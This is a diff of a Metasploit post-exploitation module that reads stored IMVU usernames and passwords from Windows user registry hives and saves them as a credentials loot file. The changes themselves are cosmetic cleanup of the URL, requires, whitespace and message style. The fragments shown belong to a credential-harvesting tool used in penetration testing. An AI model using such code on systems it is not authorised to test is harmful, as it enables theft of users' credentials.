@@ -1,17 +1,13 @@
 # -*- coding: binary -*-
 
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -54,7 +50,7 @@ class MetasploitModule < Msf::Post
       vprint_status("Looking at Key #{hive['HKU']}")
       subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
       if subkeys.nil? or subkeys.empty?
-        print_status ("IMVU not installed for this user.")
+        print_status("IMVU not installed for this user.")
         next
       end
       user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username\\", "")
@@ -79,10 +75,8 @@ class MetasploitModule < Msf::Post
         'imvu_user_creds.csv',
         'IMVU User Credentials'
       )
-
-      print_status("IMVU user credentials saved in: #{path}")
+      print_good("IMVU user credentials saved in: #{path}")
     end
 
   end
-
 end
